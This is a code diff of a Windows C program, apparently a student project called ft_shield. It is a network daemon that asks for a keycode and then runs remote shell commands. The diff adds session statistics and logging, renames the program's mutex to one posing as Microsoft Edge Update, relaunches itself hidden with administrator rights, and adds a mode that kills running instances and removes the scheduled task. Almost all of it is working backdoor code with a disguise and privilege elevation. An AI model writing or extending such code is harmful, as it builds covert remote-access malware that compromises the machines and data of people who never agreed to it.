@@ -6,7 +6,7 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/22 15:57:25 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/10/22 16:33:49 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,6 +14,7 @@
 #include <lmcons.h>
 #include <stdarg.h>
 #include <stdio.h>
+#include <tlhelp32.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 
@@ -37,8 +38,20 @@ typedef struct s_client
     SOCKET  socket;
     int     authenticated;
     int     shell_mode;
+    long    bytes_in;
+    long    bytes_out;
     t_cmd   cmd;
 }   t_client;
+
+static int cli_send(t_client *client, SOCKET socket, const char *buf, int len)
+{
+    int sent;
+
+    sent = send(socket, buf, len, 0);
+    if (sent > 0)
+        client->bytes_out += sent;
+    return sent;
+}
 
 SOCKET init_server(void)
 {
@@ -106,8 +119,8 @@ int mode_daemon(void)
     int i;
     const char *help_message;
 
-    help_message = "\n+--------------- COMMANDS ---------------+\n| ?      Show available commands        |\n| shell  Enter safe shell mode           |\n+----------------------------------------+\n$> ";
-    mutex = CreateMutexW(NULL, FALSE, L"Global\\ft_shield");
+    help_message = "\n+--------------- COMMANDS ---------------+\n| ?      Show available commands        |\n| stats  Show session I/O statistics    |\n| shell  Enter safe shell mode           |\n+----------------------------------------+\n$> ";
+    mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
     if (mutex == NULL)
     {
         debug_printf("Erreur mutex : %lu\n", (unsigned long)GetLastError());
@@ -141,6 +154,8 @@ int mode_daemon(void)
         clients[i].socket = INVALID_SOCKET;
         clients[i].authenticated = 0;
         clients[i].shell_mode = 0;
+        clients[i].bytes_in = 0;
+        clients[i].bytes_out = 0;
         clients[i].cmd = cmd_init();
         i++;
     }
@@ -179,9 +194,12 @@ int mode_daemon(void)
                         clients[slot].socket = client;
                         clients[slot].authenticated = 0;
                         clients[slot].shell_mode = 0;
+                        clients[slot].bytes_in = 0;
+                        clients[slot].bytes_out = 0;
                         clients[slot].cmd = cmd_init();
                         FD_SET(client, &fd_list);
-                        send(client, "Keycode: ", 9, 0);
+                        cli_send(&clients[slot], client, "Keycode: ", 9);
+                        log_write("CONNECT");
                         debug_printf("Client connected: %llu\n", (unsigned long long)client);
                     }
                 }
@@ -194,6 +212,8 @@ int mode_daemon(void)
                 if (slot < MAX_CLIENTS)
                 {
                     received = recv(current, buffer, sizeof(buffer) - 1, 0);
+                    if (received > 0)
+                        clients[slot].bytes_in += received;
                     if (received <= 0)
                     {
                         debug_printf("Client disconnected: %llu\n",
@@ -204,6 +224,8 @@ int mode_daemon(void)
                         clients[slot].socket = INVALID_SOCKET;
                         clients[slot].authenticated = 0;
                         clients[slot].shell_mode = 0;
+                        log_write("DISCONNECT (in: %ld, out: %ld)",
+                            clients[slot].bytes_in, clients[slot].bytes_out);
                     }
                     else
                     {
@@ -215,10 +237,16 @@ int mode_daemon(void)
                             if (password_check(buffer))
                             {
                                 clients[slot].authenticated = 1;
-                                send(current, "Authentication success\n$> ", 26, 0);
+                                log_write("AUTH OK");
+                                cli_send(&clients[slot], current,
+                                    "Authentication success\n$> ", 26);
                             }
                             else
-                                send(current, "Wrong keycode\nKeycode: ", 23, 0);
+                            {
+                                log_write("AUTH FAIL");
+                                cli_send(&clients[slot], current,
+                                    "Wrong keycode\nKeycode: ", 23);
+                            }
                         }
                         else if (clients[slot].shell_mode)
                         {
@@ -226,30 +254,47 @@ int mode_daemon(void)
                             {
                                 cmd_stop(&clients[slot].cmd);
                                 clients[slot].shell_mode = 0;
-                                send(current, "Leaving shell\n$> ", 17, 0);
+                                cli_send(&clients[slot], current,
+                                    "Leaving shell\n$> ", 17);
                             }
                             else
                             {
                                 debug_printf("Shell command from %llu: %s\n",
                                         (unsigned long long)current, buffer);
+                                log_write("SHELL: %s", buffer);
                                 if (!cmd_exec(&clients[slot].cmd, buffer))
                                 {
-                                    send(current, "Failed to execute command\nshell> ",
-                                            33, 0);
+                                    cli_send(&clients[slot], current,
+                                        "Failed to execute command\nshell> ",
+                                        33);
                                 }
                                 else if (!cmd_send_output(&clients[slot].cmd, current))
                                 {
-                                    send(current, "Failed to read command output\n",
-                                            30, 0);
+                                    cli_send(&clients[slot], current,
+                                        "Failed to read command output\n",
+                                        30);
                                 }
                                 else
-                                    send(current, "\nshell> ", 8, 0);
+                                    cli_send(&clients[slot], current,
+                                        "\nshell> ", 8);
                             }
                         }
                         else
                         {
                             if (strcmp(buffer, "?") == 0)
-                                send(current, help_message, (int)strlen(help_message), 0);
+                                cli_send(&clients[slot], current, help_message,
+                                    (int)strlen(help_message));
+                            else if (strcmp(buffer, "stats") == 0)
+                            {
+                                char stats[96];
+
+                                snprintf(stats, sizeof(stats),
+                                    "Received: %ld bytes | Sent: %ld bytes\n$> ",
+                                    clients[slot].bytes_in,
+                                    clients[slot].bytes_out);
+                                cli_send(&clients[slot], current, stats,
+                                    (int)strlen(stats));
+                            }
                             else if (strcmp(buffer, "shell") == 0)
                             {
                                 clients[slot].cmd = cmd_init();
@@ -257,18 +302,22 @@ int mode_daemon(void)
                                 {
                                     debug_printf("Client %llu: failed to start shell\n",
                                             (unsigned long long)current);
-                                    send(current, "Shell failed to start\n$> ", 25, 0);
+                                    cli_send(&clients[slot], current,
+                                        "Shell failed to start\n$> ", 25);
                                 }
                                 else
                                 {
                                     clients[slot].shell_mode = 1;
-                                    send(current, "Shell started\nshell> ", 21, 0);
+                                    cli_send(&clients[slot], current,
+                                        "Shell started\nshell> ", 21);
                                 }
                             }
                             else
                             {
                                 debug_printf("Client %llu: %s\n", (unsigned long long)current, buffer);
-                                send(current, "Message received\n$> ", 20, 0);
+                                log_write("CMD: %s", buffer);
+                                cli_send(&clients[slot], current,
+                                    "Message received\n$> ", 20);
                             }
                         }
                     }
@@ -291,11 +340,67 @@ int mode_daemon(void)
     return (1);
 }
 
+int mode_kill(void)
+{
+    HANDLE snapshot;
+    PROCESSENTRY32 entry;
+    HANDLE process;
+    char self[MAX_PATH];
+    DWORD self_pid;
+    int killed;
+
+    killed = 0;
+    self_pid = GetCurrentProcessId();
+    if (GetModuleFileNameA(NULL, self, MAX_PATH) == 0)
+        self[0] = '\0';
+    task_uninstall();
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snapshot == INVALID_HANDLE_VALUE)
+        return (0);
+    entry.dwSize = sizeof(entry);
+    if (Process32First(snapshot, &entry))
+    {
+        do {
+            if (strcmp(entry.szExeFile, "ft_shield.exe") != 0
+                || entry.th32ProcessID == self_pid)
+                continue ;
+            process = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE,
+                entry.th32ProcessID);
+            if (process == NULL)
+                continue ;
+            if (TerminateProcess(process, 0))
+            {
+                WaitForSingleObject(process, 3000);
+                killed++;
+            }
+            CloseHandle(process);
+        } while (Process32Next(snapshot, &entry));
+    }
+    CloseHandle(snapshot);
+    debug_printf("Killed %d instance(s)\n", killed);
+    return (0);
+}
+
+int spawn_elevated(void)
+{
+    char path[MAX_PATH];
+    SHELLEXECUTEINFOA info = {0};
+
+    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
+        return (0);
+    info.cbSize = sizeof(info);
+    info.lpVerb = "runas";
+    info.lpFile = path;
+    info.nShow = SW_HIDE;
+    if (!ShellExecuteExA(&info))
+        return (0);
+    return (1);
+}
+
 int mode_normal(void)
 {
     if (is_elevated() <= 0)
-        return (0);
-
+        return (spawn_elevated());
     char login[UNLEN + 1];
     DWORD size = sizeof(login);
     char *mpath;
@@ -346,8 +451,15 @@ int mode_normal(void)
 
 int main(int argc, char **argv)
 {
+    if (AttachConsole(ATTACH_PARENT_PROCESS))
+    {
+        freopen("CONOUT$", "w", stdout);
+        freopen("CONOUT$", "w", stderr);
+    }
     if (argc == 2 && strcmp(argv[1], "--daemon") == 0)
         return (mode_daemon());
+    if (argc == 2 && strcmp(argv[1], "--kill") == 0)
+        return (mode_kill());
 
     return (mode_normal());
 }
